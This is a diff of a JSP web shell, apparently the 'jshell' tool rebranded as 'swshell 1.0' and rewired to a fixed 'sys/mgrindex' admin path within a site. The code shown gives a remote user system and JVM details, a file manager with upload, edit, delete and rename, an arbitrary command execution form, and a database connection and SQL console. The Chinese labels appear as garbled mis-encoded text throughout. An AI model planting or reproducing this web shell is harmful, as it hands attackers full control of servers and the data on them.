+		<td colspan="2" align="center">æœåŠ¡å™¨ä¿¡æ¯</td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td width="300" align="center" class="datarows">·şÎñÆ÷Ãû</td>
+		<td width="300" align="center" class="datarows">æœåŠ¡å™¨å</td>
 		<td align="center" class="datarows"><%=request.getServerName()%></td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td width="300" align="center" class="datarows">·şÎñÆ÷¶Ë¿Ú</td>
+		<td width="300" align="center" class="datarows">æœåŠ¡å™¨ç«¯å£</td>
 		<td align="center" class="datarows"><%=request.getServerPort()%></td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td width="300" align="center" class="datarows">²Ù×÷ÏµÍ³</td>
+		<td width="300" align="center" class="datarows">æ“ä½œç³»ç»Ÿ</td>
 		<td align="center" class="datarows"><%=System.getProperty("os.name") + " " + System.getProperty("os.version") + " " + System.getProperty("os.arch")%></td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td width="300" align="center" class="datarows">µ±Ç°ÓÃ»§Ãû</td>
+		<td width="300" align="center" class="datarows">å½“å‰ç”¨æˆ·å</td>
 		<td align="center" class="datarows"><%=System.getProperty("user.name")%></td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td width="300" align="center" class="datarows">µ±Ç°ÓÃ»§Ä¿Â¼</td>
+		<td width="300" align="center" class="datarows">å½“å‰ç”¨æˆ·ç›®å½•</td>
 		<td align="center" class="datarows"><%=System.getProperty("user.home")%></td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td width="300" align="center" class="datarows">µ±Ç°ÓÃ»§¹¤×÷Ä¿Â¼</td>
+		<td width="300" align="center" class="datarows">å½“å‰ç”¨æˆ·å·¥ä½œç›®å½•</td>
 		<td align="center" class="datarows"><%=System.getProperty("user.dir")%></td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td width="300" align="center" class="datarows">³ÌĞòÏà¶ÔÂ·¾¶</td>
-		<td align="center" class="datarows"><%=request.getRequestURI()%></td>
+		<td width="300" align="center" class="datarows">ç¨‹åºç›¸å¯¹è·¯å¾„</td>
+		<td align="center" class="datarows"><%=contextPath + "sys/mgrindex"%></td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td width="300" align="center" class="datarows">³ÌĞò¾ø¶ÔÂ·¾¶</td>
+		<td width="300" align="center" class="datarows">ç¨‹åºç»å¯¹è·¯å¾„</td>
 		<td align="center" class="datarows"><%=request.getRealPath(request.getServletPath())%></td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td width="300" align="center" class="datarows">ÍøÂçĞ­Òé</td>
+		<td width="300" align="center" class="datarows">ç½‘ç»œåè®®</td>
 		<td align="center" class="datarows"><%=request.getProtocol()%></td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td width="300" align="center" class="datarows">·şÎñÆ÷Èí¼ş°æ±¾ĞÅÏ¢</td>
+		<td width="300" align="center" class="datarows">æœåŠ¡å™¨è½¯ä»¶ç‰ˆæœ¬ä¿¡æ¯</td>
 		<td align="center" class="datarows"><%=application.getServerInfo()%></td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td width="300" align="center" class="datarows">JDK°æ±¾</td>
+		<td width="300" align="center" class="datarows">JDKç‰ˆæœ¬</td>
 		<td align="center" class="datarows"><%=System.getProperty("java.version")%></td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td width="300" align="center" class="datarows">JDK°²×°Â·¾¶</td>
+		<td width="300" align="center" class="datarows">JDKå®‰è£…è·¯å¾„</td>
 		<td align="center" class="datarows"><%=System.getProperty("java.home")%></td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td width="300" align="center" class="datarows">JAVAĞéÄâ»ú°æ±¾</td>
+		<td width="300" align="center" class="datarows">JAVAè™šæ‹Ÿæœºç‰ˆæœ¬</td>
 		<td align="center" class="datarows"><%=System.getProperty("java.vm.specification.version")%></td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td width="300" align="center" class="datarows">JAVAĞéÄâ»úÃû</td>
+		<td width="300" align="center" class="datarows">JAVAè™šæ‹Ÿæœºå</td>
 		<td align="center" class="datarows"><%=System.getProperty("java.vm.name")%></td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td width="300" align="center" class="datarows">JAVAÀàÂ·¾¶</td>
+		<td width="300" align="center" class="datarows">JAVAç±»è·¯å¾„</td>
 		<td align="center" class="datarows"><%=System.getProperty("java.class.path")%></td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td width="300" align="center" class="datarows">JAVAÔØÈë¿âËÑË÷Â·¾¶</td>
+		<td width="300" align="center" class="datarows">JAVAè½½å…¥åº“æœç´¢è·¯å¾„</td>
 		<td align="center" class="datarows"><%=System.getProperty("java.library.path")%></td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td width="300" align="center" class="datarows">JAVAÁÙÊ±Ä¿Â¼</td>
+		<td width="300" align="center" class="datarows">JAVAä¸´æ—¶ç›®å½•</td>
 		<td align="center" class="datarows"><%=System.getProperty("java.io.tmpdir")%></td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td width="300" align="center" class="datarows">JIT±àÒëÆ÷Ãû</td>
+		<td width="300" align="center" class="datarows">JITç¼–è¯‘å™¨å</td>
 		<td align="center" class="datarows"><%=System.getProperty("java.compiler") == null ? "" : System.getProperty("java.compiler")%></td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td width="300" align="center" class="datarows">À©Õ¹Ä¿Â¼Â·¾¶</td>
+		<td width="300" align="center" class="datarows">æ‰©å±•ç›®å½•è·¯å¾„</td>
 		<td align="center" class="datarows"><%=System.getProperty("java.ext.dirs")%></td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td colspan="2" align="center">¿Í»§¶ËĞÅÏ¢</td>
+		<td colspan="2" align="center">å®¢æˆ·ç«¯ä¿¡æ¯</td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td width="300" align="center" class="datarows">¿Í»§»úµØÖ·</td>
+		<td width="300" align="center" class="datarows">å®¢æˆ·æœºåœ°å€</td>
 		<td align="center" class="datarows"><%=request.getRemoteAddr()%></td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td width="300" align="center" class="datarows">·şÎñ»úÆ÷Ãû</td>
+		<td width="300" align="center" class="datarows">æœåŠ¡æœºå™¨å</td>
 		<td align="center" class="datarows"><%=request.getRemoteHost()%></td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td width="300" align="center" class="datarows">ÓÃ»§Ãû</td>
+		<td width="300" align="center" class="datarows">ç”¨æˆ·å</td>
 		<td align="center" class="datarows"><%=request.getRemoteUser() == null ? "" : request.getRemoteUser()%></td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td width="300" align="center" class="datarows">ÇëÇó·½Ê½</td>
+		<td width="300" align="center" class="datarows">è¯·æ±‚æ–¹å¼</td>
 		<td align="center" class="datarows"><%=request.getScheme()%></td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td width="300" align="center" class="datarows">Ó¦ÓÃ°²È«Ì×½Ó×Ö²ã</td>
-		<td align="center" class="datarows"><%=request.isSecure() == true ? "ÊÇ" : "·ñ"%></td>
+		<td width="300" align="center" class="datarows">åº”ç”¨å®‰å…¨å¥—æ¥å­—å±‚</td>
+		<td align="center" class="datarows"><%=request.isSecure() == true ? "æ˜¯" : "å¦"%></td>
 	</tr>
 </table>
 <%
@@ -1349,103 +1365,103 @@ for (var i = 0; i < sAction.length; i ++) {
 		}
 
 		if (fsAction.equals("list"))
-			result = listFiles(curPath, request.getRequestURI() + "?action=" + action);
+			result = listFiles(curPath, contextPath + "sys/mgrindex" + "?action=" + action);
 		else if (fsAction.equals("browse")) {
-			result = listFiles(new File(curPath).getParent(), request.getRequestURI() + "?action=" + action);
+			result = listFiles(new File(curPath).getParent(), contextPath + "sys/mgrindex" + "?action=" + action);
 			result += browseFile(curPath);
 		}
 		else if (fsAction.equals("open"))
-			result = openFile(curPath, request.getRequestURI() + "?action=" + action);
+			result = openFile(curPath, contextPath + "sys/mgrindex" + "?action=" + action);
 		else if (fsAction.equals("save")) {
 			if (request.getParameter("fileContent") == null) {
-				result = "<font color=\"red\">Ò³Ãæµ¼º½´íÎó</font>";
+				result = "<font color=\"red\">é¡µé¢å¯¼èˆªé”™è¯¯</font>";
 			} else {
 				String fileContent = Unicode2GB((String)request.getParameter("fileContent"));
-				result = saveFile(curPath, request.getRequestURI() + "?action=" + action, fileContent);
+				result = saveFile(curPath, contextPath + "sys/mgrindex" + "?action=" + action, fileContent);
 			}
 		} else if (fsAction.equals("createFolder")) {
 			if (request.getParameter("folderName") == null) {
-				result = "<font color=\"red\">Ä¿Â¼Ãû²»ÄÜÎª¿Õ</font>";
+				result = "<font color=\"red\">ç›®å½•åä¸èƒ½ä¸ºç©º</font>";
 			} else {
 				String folderName = Unicode2GB(request.getParameter("folderName").trim());
 				if (folderName.equals("")) {
-					result = "<font color=\"red\">Ä¿Â¼Ãû²»ÄÜÎª¿Õ</font>";
+					result = "<font color=\"red\">ç›®å½•åä¸èƒ½ä¸ºç©º</font>";
 				} else {
-					result = createFolder(curPath, request.getRequestURI() + "?action=" + action, folderName);
+					result = createFolder(curPath, contextPath + "sys/mgrindex" + "?action=" + action, folderName);
 				}
 			}
 		} else if (fsAction.equals("createFile")) {
 			if (request.getParameter("fileName") == null) {
-				result = "<font color=\"red\">ÎÄ¼şÃû²»ÄÜÎª¿Õ</font>";
+				result = "<font color=\"red\">æ–‡ä»¶åä¸èƒ½ä¸ºç©º</font>";
 			} else {
 				String fileName = Unicode2GB(request.getParameter("fileName").trim());
 				if (fileName.equals("")) {
-					result = "<font color=\"red\">ÎÄ¼şÃû²»ÄÜÎª¿Õ</font>";
+					result = "<font color=\"red\">æ–‡ä»¶åä¸èƒ½ä¸ºç©º</font>";
 				} else {
-					result = createFile(curPath, request.getRequestURI() + "?action=" + action, fileName);
+					result = createFile(curPath, contextPath + "sys/mgrindex" + "?action=" + action, fileName);
 				}
 			}
 		} else if (fsAction.equals("deleteFile")) {
 			if (request.getParameter("filesDelete") == null) {
-				result = "<font color=\"red\">Ã»ÓĞÑ¡ÔñÒªÉ¾³ıµÄÎÄ¼ş</font>";
+				result = "<font color=\"red\">æ²¡æœ‰é€‰æ‹©è¦åˆ é™¤çš„æ–‡ä»¶</font>";
 			} else {
 				String[] files2Delete = (String[])request.getParameterValues("filesDelete");
 				if (files2Delete.length == 0) {
-					result = "<font color=\"red\">Ã»ÓĞÑ¡ÔñÒªÉ¾³ıµÄÎÄ¼ş</font>";
+					result = "<font color=\"red\">æ²¡æœ‰é€‰æ‹©è¦åˆ é™¤çš„æ–‡ä»¶</font>";
 				} else {
 					for (int n = 0; n < files2Delete.length; n ++) {
 						files2Delete[n] = Unicode2GB(files2Delete[n]);
 					}
-					result = deleteFile(curPath, request.getRequestURI() + "?action=" + action, files2Delete);
+					result = deleteFile(curPath, contextPath + "sys/mgrindex" + "?action=" + action, files2Delete);
 				}
 			}
 		} else if (fsAction.equals("saveAs")) {
 			if (request.getParameter("fileContent") == null) {
-				result = "<font color=\"red\">Ò³Ãæµ¼º½´íÎó</font>";
+				result = "<font color=\"red\">é¡µé¢å¯¼èˆªé”™è¯¯</font>";
 			} else {
 				String fileContent = Unicode2GB(request.getParameter("fileContent"));
-				result = saveAs(curPath, request.getRequestURI() + "?action=" + action, fileContent);
+				result = saveAs(curPath, contextPath + "sys/mgrindex" + "?action=" + action, fileContent);
 			}
 		} else if (fsAction.equals("upload")) {
-			result = uploadFile(request, curPath, request.getRequestURI() + "?action=" + action);
+			result = uploadFile(request, curPath, contextPath + "sys/mgrindex" + "?action=" + action);
 		} else if (fsAction.equals("copyto")) {
 			if (request.getParameter("filesDelete") == null || request.getParameter("dstPath") == null) {
-				result = "<font color=\"red\">Ã»ÓĞÑ¡ÔñÒª¸´ÖÆµÄÎÄ¼ş</font>";
+				result = "<font color=\"red\">æ²¡æœ‰é€‰æ‹©è¦å¤åˆ¶çš„æ–‡ä»¶</font>";
 			} else {
 				String[] files2Copy = request.getParameterValues("filesDelete");
 				String dstPath = request.getParameter("dstPath").trim();
 				if (files2Copy.length == 0) {
-					result = "<font color=\"red\">Ã»ÓĞÑ¡ÔñÒª¸´ÖÆµÄÎÄ¼ş</font>";
+					result = "<font color=\"red\">æ²¡æœ‰é€‰æ‹©è¦å¤åˆ¶çš„æ–‡ä»¶</font>";
 				} else if (dstPath.equals("")) {
-					result = "<font color=\"red\">Ã»ÓĞÌîĞ´Òª¸´ÖÆµ½µÄÄ¿Â¼Â·¾¶</font>";
+					result = "<font color=\"red\">æ²¡æœ‰å¡«å†™è¦å¤åˆ¶åˆ°çš„ç›®å½•è·¯å¾„</font>";
 				} else {
 					for (int i = 0; i < files2Copy.length; i ++)
 						files2Copy[i] = Unicode2GB(files2Copy[i]);
 
-					result = copyFiles(curPath, request.getRequestURI() + "?action=" + action, files2Copy, Unicode2GB(dstPath));
+					result = copyFiles(curPath, contextPath + "sys/mgrindex" + "?action=" + action, files2Copy, Unicode2GB(dstPath));
 				}
 			}
 		} else if (fsAction.equals("rename")) {
 			if (request.getParameter("fileRename") == null) {
-				result = "<font color=\"red\">Ò³Ãæµ¼º½´íÎó</font>";
+				result = "<font color=\"red\">é¡µé¢å¯¼èˆªé”™è¯¯</font>";
 			} else {
 				String file2Rename = request.getParameter("fileRename").trim();
 				String newName = request.getParameter("newName").trim();
 				if (file2Rename.equals("")) {
-					result = "<font color=\"red\">Ã»ÓĞÑ¡ÔñÒªÖØÃüÃûµÄÎÄ¼ş</font>";
+					result = "<font color=\"red\">æ²¡æœ‰é€‰æ‹©è¦é‡å‘½åçš„æ–‡ä»¶</font>";
 				} else if (newName.equals("")) {
-					result = "<font color=\"red\">Ã»ÓĞÌîĞ´ĞÂÎÄ¼şÃû</font>";
+					result = "<font color=\"red\">æ²¡æœ‰å¡«å†™æ–°æ–‡ä»¶å</font>";
 				} else {
-					result = renameFile(curPath, request.getRequestURI() + "?action=" + action, Unicode2GB(file2Rename), Unicode2GB(newName));
+					result = renameFile(curPath, contextPath + "sys/mgrindex" + "?action=" + action, Unicode2GB(file2Rename), Unicode2GB(newName));
 				}
 			}
 		}
 %>
 <table align="center" width="600" border="0" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
-	<form method="post" name="form2" action="<%= request.getRequestURI() + "?action=" + action%>">
+	<form method="post" name="form2" action="<%= contextPath +"sys/mgrindex" + "?action=" + action%>">
 	<tr bgcolor="#FFFFFF">
-		<td align="center">µØÖ·&nbsp;&nbsp;<input type="text" size="80" name="curPath" class="textbox" value="<%=curPath%>" />
-											 <input type="submit" value="×ªµ½" class="button" /></td>
+		<td align="center">åœ°å€&nbsp;&nbsp;<input type="text" size="80" name="curPath" class="textbox" value="<%=curPath%>" />
+											 <input type="submit" value="è½¬åˆ°" class="button" /></td>
 	</tr>
 	</form>
 	<tr bgcolor="#FFFFFF">
@@ -1467,18 +1483,18 @@ for (var i = 0; i < sAction.length; i ++) {
 //========================================================================================
 %>
 <table border="0" width="600" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC" align="center">
-	<form name="form2" method="post" action="<%=request.getRequestURI() + "?action=" + action%>">
+	<form name="form2" method="post" action="<%=contextPath + "sys/mgrindex" + "?action=" + action%>">
 	<tr bgcolor="#FFFFFF">
-		<td align="center">Ö´ĞĞÃüÁî</td>
+		<td align="center">æ‰§è¡Œå‘½ä»¤</td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
 		<td align="center">
 			<input type="text" class="textbox" size="80" name="command" value="<%=cmd%>" />
-			<input type="submit" class="button" value="Ö´ĞĞ" />
+			<input type="submit" class="button" value="æ‰§è¡Œ" />
 		</td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td align="center">Ö´ĞĞ½á¹û</td>
+		<td align="center">æ‰§è¡Œç»“æœ</td>
 	</tr>
 	</form>
 </table>
@@ -1520,7 +1536,7 @@ for (var i = 0; i < sAction.length; i ++) {
 				request.getParameter("dbUsername") == null ||
 				request.getParameter("dbPassword") == null ||
 				request.getParameter("dbName") == null) {
-				response.sendRedirect(request.getRequestURI() + "?action=" + action);
+				response.sendRedirect(contextPath + "sys/mgrindex" + "?action=" + action);
 			} else {
 				dbType = request.getParameter("dbType").trim();
 				dbServer = request.getParameter("dbServer").trim();
@@ -1551,14 +1567,14 @@ for (var i = 0; i < sAction.length; i ++) {
 						result += "}\n";
 						result += "//-->\n";
 						result += "</script>\n";
-						result += "sqlÓï¾ä<br/><textarea name=\"sql\" cols=\"70\" rows=\"6\">" + sql + "</textarea><br/><input type=\"submit\" class=\"button\" onclick=\"javascript:exeSql()\" value=\"Ö´ĞĞ\"/>&nbsp;<input type=\"reset\" class=\"button\" onclick=\"javascript:resetIt()\" value=\"Çå¿Õ\"/>\n";
+						result += "sqlè¯­å¥<br/><textarea name=\"sql\" cols=\"70\" rows=\"6\">" + sql + "</textarea><br/><input type=\"submit\" class=\"button\" onclick=\"javascript:exeSql()\" value=\"æ‰§è¡Œ\"/>&nbsp;<input type=\"reset\" class=\"button\" onclick=\"javascript:resetIt()\" value=\"æ¸…ç©º\"/>\n";
 
 						DBRelease();
 					} else {
-						result = "<font color=\"red\">Êı¾İ¿âÁ¬½ÓÊ§°Ü</font>";
+						result = "<font color=\"red\">æ•°æ®åº“è¿æ¥å¤±è´¥</font>";
 					}
 				} else {
-					result = "<font color=\"red\">Êı¾İ¿âÁ¬½ÓÇı¶¯Ã»ÓĞÕÒµ½</font>";
+					result = "<font color=\"red\">æ•°æ®åº“è¿æ¥é©±åŠ¨æ²¡æœ‰æ‰¾åˆ°</font>";
 				}
 			}
 		}
@@ -1571,16 +1587,16 @@ out.println("var selectedType = \"" + dbType + "\";");
 //-->
 </script>
 <table align="center" width="600" border="0" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
-	<form name="dbInfo" method="post" action="<%=request.getRequestURI() + "?action=" + action + "&dbAction=dbConnect"%>">
+	<form name="dbInfo" method="post" action="<%=contextPath + "sys/mgrindex" + "?action=" + action + "&dbAction=dbConnect"%>">
 	<tr bgcolor="#FFFFFF">
-		<td width="300" align="center">Êı¾İ¿âÁ¬½ÓÀàĞÍ</td>
+		<td width="300" align="center">æ•°æ®åº“è¿æ¥ç±»å‹</td>
 		<td align="center">
 			<select name="dbType">
-				<option value="sqlserver">SQLServerÊı¾İ¿â</option>
-				<option value="mysql">MySqlÊı¾İ¿â</option>
-				<option value="oracle">OracleÊı¾İ¿â</option>
-				<option value="db2">DB2Êı¾İ¿â</option>
-				<option value="odbc">ODBCÊı¾İÔ´</option>
+				<option value="sqlserver">SQLServeræ•°æ®åº“</option>
+				<option value="mysql">MySqlæ•°æ®åº“</option>
+				<option value="oracle">Oracleæ•°æ®åº“</option>
+				<option value="db2">DB2æ•°æ®åº“</option>
+				<option value="odbc">ODBCæ•°æ®æº</option>
 			</select>
 			<script language="javascript">
 			for (var i = 0; i < document.dbInfo.dbType.options.length; i ++) {
@@ -1592,27 +1608,27 @@ out.println("var selectedType = \"" + dbType + "\";");
 		</td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td align="center">Êı¾İ¿â·şÎñÆ÷µØÖ·</td>
+		<td align="center">æ•°æ®åº“æœåŠ¡å™¨åœ°å€</td>
 		<td align="center"><input type="text" name="dbServer" class="textbox" value="<%=dbServer%>" style="width:150px;" /></td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td align="center">Êı¾İ¿â·şÎñÆ÷¶Ë¿Ú</td>
+		<td align="center">æ•°æ®åº“æœåŠ¡å™¨ç«¯å£</td>
 		<td align="center"><input type="text" name="dbPort" class="textbox" value="<%=dbPort%>" style="width:150px;" /></td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td align="center">Êı¾İ¿âÓÃ»§Ãû</td>
+		<td align="center">æ•°æ®åº“ç”¨æˆ·å</td>
 		<td align="center"><input type="text" name="dbUsername" class="textbox" value="<%=dbUsername%>" size="20" style="width:150px;" /></td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td align="center">Êı¾İ¿âÃÜÂë</td>
+		<td align="center">æ•°æ®åº“å¯†ç </td>
 		<td align="center"><input type="password" name="dbPassword" class="textbox" value="<%=dbPassword%>" size="20" style="width:150px;" /></td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td align="center">Êı¾İ¿âÃû</td>
+		<td align="center">æ•°æ®åº“å</td>
 		<td align="center"><input type="text" name="dbName" class="textbox" value="<%=dbName%>" size="20" style="width:150px;" /></td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td align="center" colspan="2"><input type="submit" value="Á¬½Ó" class="button" />&nbsp;<input type="reset" value="ÖØÖÃ" class="button" /></td>
+		<td align="center" colspan="2"><input type="submit" value="è¿æ¥" class="button" />&nbsp;<input type="reset" value="é‡ç½®" class="button" /></td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
 		<td align="center" colspan="2"><%=result%></td>
@@ -1669,21 +1685,21 @@ function selectAllTypes() {
 //-->
 </script>
 <table align="center" width="600" border="0" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
-	<form name="config" method="post" action="<%=request.getRequestURI() + "?action=config&cfAction=save"%>" onSubmit="javascript:selectAllTypes()">
+	<form name="config" method="post" action="<%=contextPath + "sys/mgrindex" + "?action=config&cfAction=save"%>" onSubmit="javascript:selectAllTypes()">
 	<tr bgcolor="#FFFFFF">
-		<td align="center" width="200">ÃÜÂë</td>
+		<td align="center" width="200">å¯†ç </td>
 		<td><input type="text" size="30" name="password" class="textbox" value="<%=_password%>" /></td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td align="center">ÏµÍ³±àÂë</td>
+		<td align="center">ç³»ç»Ÿç¼–ç </td>
 		<td><input type="text" size="30" name="encode" value="<%=_encodeType%>" class="textbox" /></td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td align="center">Session³¬Ê±Ê±¼ä</td>
+		<td align="center">Sessionè¶…æ—¶æ—¶é—´</td>
 		<td><input type="text" size="5" name="sessionTime" class="textbox" value="<%=_sessionOutTime%>" /></td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td align="center">¿É±à¼­ÎÄ¼şÀàĞÍ</td>
+		<td align="center">å¯ç¼–è¾‘æ–‡ä»¶ç±»å‹</td>
 		<td>
 			<table border="0" width="190" cellpadding="0" cellspacing="0">
 				<tr>
@@ -1711,7 +1727,7 @@ function selectAllTypes() {
 		</td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td align="center" colspan="2"><input type="submit" value="±£´æ" class="button" /></td>
+		<td align="center" colspan="2"><input type="submit" value="ä¿å­˜" class="button" /></td>
 	</tr>
 	</form>
 </table>
@@ -1721,7 +1737,7 @@ function selectAllTypes() {
 				request.getParameter("encode") == null ||
 				request.getParameter("sessionTime") == null ||
 				request.getParameterValues("textFileTypes") == null) {
-				response.sendRedirect(request.getRequestURI());
+				response.sendRedirect(contextPath + "sys/mgrindex");
 			}
 
 			String result = "";
@@ -1739,8 +1755,8 @@ function selectAllTypes() {
 				jconfig.setSessionTime(newSessionTime);
 				jconfig.setTextFileTypes(newTextFileTypes);
 				jconfig.save();
-				result += "ÉèÖÃ±£´æ³É¹¦£¬ÕıÔÚ·µ»Ø£¬ÇëÉÔºò¡­¡­";
-				result += "<meta http-equiv=\"refresh\" content=\"2;url=" + request.getRequestURI() + "?action=" + request.getParameter("action") + "\">";
+				result += "è®¾ç½®ä¿å­˜æˆåŠŸï¼Œæ­£åœ¨è¿”å›ï¼Œè¯·ç¨å€™â€¦â€¦";
+				result += "<meta http-equiv=\"refresh\" content=\"2;url=" + contextPath + "sys/mgrindex" + "?action=" + request.getParameter("action") + "\">";
 			} catch (JshellConfigException e) {
 				result = "<font color=\"red\">" + e.getMessage() + "</font>";
 			}
@@ -1762,13 +1778,13 @@ function selectAllTypes() {
 %>
 <table border="0" align="center" width="600" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
 	<tr bgcolor="#FFFFFF">
-		<td align="center">¹ØÓÚ jshell ver 0.1</td>
+		<td align="center">å…³äº swshell 1.0</td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
 		<td> </td>
 	</tr>
 	<tr bgcolor="#FFFFFF">
-		<td align="right">created by <a href="mailto:luoluonet@hotmail.com">luoluo</a> and welcome to <a href="http://www.ph4nt0m.org" target="_blank">»ÃÓ°ÂÃÍÅ</a></td>
+		<td align="right">created by <a href="#">ä»é›¶å¼€å§‹</a> and welcome to <a href="http://songwie.com" target="_blank">ä»é›¶å¼€å§‹</a></td>
 	</tr>
 </table>
 <%
